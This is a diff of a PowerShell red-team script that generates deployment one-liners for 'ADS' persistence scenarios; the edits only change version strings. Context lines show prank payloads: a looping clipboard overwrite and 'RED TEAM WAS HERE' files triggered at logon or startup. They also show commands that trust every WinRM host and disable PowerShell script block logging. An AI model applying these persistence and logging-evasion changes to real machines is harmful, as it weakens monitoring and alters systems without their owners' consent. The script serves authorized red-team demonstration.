@@ -1,6 +1,6 @@
 <#
 .SYNOPSIS
-    Red Team Showcase — generate deployment one-liners for all ADS v2.4 showcase scenarios.
+    Red Team Showcase — generate deployment one-liners for all ADS v2.5 showcase scenarios.
 
 .DESCRIPTION
     Runs on Kali/Linux (pwsh). Generates ready-to-deploy ADS one-liners for every
@@ -59,7 +59,7 @@
 
 .NOTES
     Author: Queue + Red Team
-    Version: 1.0 (ADS v2.4)
+    Version: 1.1 (ADS v2.5)
     Requires: pwsh, ADS-OneLiner.ps1 in ../src/
     Run from project root or tests/ directory.
     AUTHORIZED USE ONLY — see docs/PROJECT-AUTHORIZATION.md
@@ -194,7 +194,7 @@ Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force
         PayloadScript = @'
 Add-Type -AssemblyName PresentationCore
 while($true){
-  [Windows.Clipboard]::SetText('Never gonna give you up — Red Team was here — ADS v2.4')
+  [Windows.Clipboard]::SetText('Never gonna give you up — Red Team was here — ADS v2.5')
   Start-Sleep -Seconds 30
 }
 '@
@@ -284,7 +284,7 @@ $i=0
 while((Get-Date)-lt $end){
   [Console]::SetCursorPosition(0,0)
   Write-Host $frames[$i%4] -ForegroundColor Cyan
-  Write-Host "RED TEAM WAS HERE — ADS v2.4" -ForegroundColor Red
+  Write-Host "RED TEAM WAS HERE — ADS v2.5" -ForegroundColor Red
   $i++; Start-Sleep -Milliseconds 250
 }
 Write-Host "`n=== PROOF OF COMPROMISE ===" -ForegroundColor Red
@@ -306,7 +306,7 @@ Start-Sleep -Seconds 8
         Triggers  = @('AtLogOn','AtStartup')
         Admin     = $false
         PayloadScript = @'
-$msg = "RED TEAM WAS HERE`nApparition Delivery System v2.4`nHostname: $env:COMPUTERNAME`nTime: $(Get-Date)"
+$msg = "RED TEAM WAS HERE`nApparition Delivery System v2.5`nHostname: $env:COMPUTERNAME`nTime: $(Get-Date)"
 @('C:\Users\Public\Desktop\OIIA_RED_TEAM_WAS_HERE.txt',"$env:TEMP\OIIA_RED_TEAM_WAS_HERE.txt") |
   ForEach-Object { $msg | Out-File -FilePath $_ -Force -Encoding UTF8 -EA 0 }
 '@
@@ -383,7 +383,7 @@ Set-ItemProperty $lp -Name EnableScriptBlockLogging -Value 0 -Type DWord -Force
         Admin     = $false
         PayloadScript = @'
 Add-Type -AssemblyName PresentationCore
-while($true){ [Windows.Clipboard]::SetText('RED TEAM WAS HERE — ADS v2.4'); Start-Sleep 30 }
+while($true){ [Windows.Clipboard]::SetText('RED TEAM WAS HERE — ADS v2.5'); Start-Sleep 30 }
 '@
         Validate  = 'Clipboard replaced at next logon'
         Validated = $true
@@ -445,7 +445,7 @@ $total = ($toRun | Measure-Object).Count
 $done = 0
 
 Write-Host ""
-Write-Host "=== ADS v2.4 Red Team Showcase Generator ===" -ForegroundColor Cyan
+Write-Host "=== ADS v2.5 Red Team Showcase Generator ===" -ForegroundColor Cyan
 Write-Host "Scenarios  : $($toRun -join ', ')" -ForegroundColor Gray
 Write-Host "Obfuscate  : $Obfuscate" -ForegroundColor Gray
 Write-Host "Output dir : $OutputDir" -ForegroundColor Gray
